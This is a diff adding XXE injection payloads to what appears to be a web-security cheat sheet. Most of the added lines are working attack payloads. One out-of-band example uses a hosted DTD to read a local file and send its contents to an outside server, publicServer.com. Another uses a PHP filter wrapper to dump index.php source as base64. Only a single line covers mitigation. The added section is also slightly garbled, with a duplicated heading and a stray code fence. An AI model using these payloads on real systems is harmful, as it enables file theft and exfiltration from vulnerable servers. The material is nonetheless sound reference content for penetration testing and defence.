@@ -1449,3 +1449,34 @@ XXE vulnerabilities often exist in **XML-RPC implementations** and other XML-bas
   <lastName>&example;</lastName>
  </userInfo>
 ```
+### XXE OOB Attack (Yunusov, 2013).
+### XXE OOB Attack (Yunusov, 2013)
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<data>&send;</data>
+```
+### File stored on http://publicServer.com/parameterEntity_oob.dtd
+```
+<!ENTITY % file SYSTEM "file:///sys/power/image_size">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+%all;
+```
+### XXE PHP Wrapper
+```
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue du CTF</adress>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+```
+🔹 **Tools for Testing**: 
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+```
+🔹 **Mitigation**: Disable external entity processing in XML parsers or use libraries with built-in protection against XXE.  
+🔹 **Tools for Testing**: Burp Suite, OWASP ZAP, and `xxe.py` can help in identifying XXE vulnerabilities.
